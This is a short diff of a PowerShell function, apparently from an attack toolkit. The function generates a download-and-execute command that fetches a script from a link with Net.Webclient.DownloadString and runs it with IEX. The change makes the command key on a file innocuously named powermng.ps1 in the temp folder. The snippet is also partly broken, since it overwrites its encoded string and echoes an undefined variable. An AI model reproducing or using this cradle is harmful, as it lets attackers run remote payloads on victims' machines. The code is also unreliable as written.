@@ -465,7 +465,7 @@ function Encode-Script {
 $link = Get-Link 
 $bytes = [Text.Encoding]::Unicode.GetBytes($link)
 $enc = [Convert]::ToBase64String($bytes)
-$enc = "if (-NOT (Test-Path `$DestinationFile)) {IEX (New-Object Net.Webclient).DownloadString('$link') }"
+$enc = "if (-NOT (Test-Path `$env:temp/powermng.ps1)) {IEX (New-Object Net.Webclient).DownloadString('$link') }"
 echo $base
 }
 
